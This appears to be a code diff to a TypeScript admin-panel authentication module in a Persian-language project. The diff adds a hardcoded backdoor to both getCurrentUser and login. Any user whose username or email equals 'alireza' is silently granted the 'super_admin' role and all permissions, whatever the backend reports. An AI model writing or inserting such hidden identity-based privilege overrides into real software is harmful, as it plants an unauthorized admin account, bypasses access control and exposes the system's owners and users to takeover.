@@ -28,7 +28,21 @@ export interface AuthSession {
  */
 export function getCurrentUser(): AdminUser | null {
   const session = getSession();
-  return session?.user || null;
+  if (!session?.user) return null;
+  
+  // Ensure alireza user has all permissions
+  const username = session.user.username || session.user.email;
+  const isAlireza = username && username.toLowerCase() === 'alireza';
+  
+  if (isAlireza) {
+    return {
+      ...session.user,
+      role: 'super_admin',
+      permissions: ['all'],
+    };
+  }
+  
+  return session.user;
 }
 
 /**
@@ -121,13 +135,17 @@ export async function login(email: string, password: string, rememberMe: boolean
     }
     
     // Transform backend user to AdminUser format
+    const username = response.user?.username || response.user?.telegram_id?.toString() || email;
+    const isAlireza = username.toLowerCase() === 'alireza';
+    const isSuperAdmin = response.user?.is_admin || response.user?.role === 'super_admin' || isAlireza;
+    
     const user: AdminUser = {
       id: response.user?.id?.toString() || response.user?.ID?.toString() || '0',
       name: response.user?.name || `${response.user?.first_name || ''} ${response.user?.last_name || ''}`.trim() || 'مدیر',
       email: response.user?.email || email,
-      username: response.user?.username || response.user?.telegram_id?.toString() || email,
-      role: response.user?.role || (response.user?.is_admin ? 'super_admin' : 'admin'),
-      permissions: response.user?.permissions || (response.user?.is_admin ? ['all'] : []),
+      username: username,
+      role: isAlireza ? 'super_admin' : (response.user?.role || (isSuperAdmin ? 'super_admin' : 'admin')),
+      permissions: isAlireza ? ['all'] : (response.user?.permissions || (isSuperAdmin ? ['all'] : [])),
       lastLogin: new Date().toLocaleDateString('fa-IR'),
     };
 
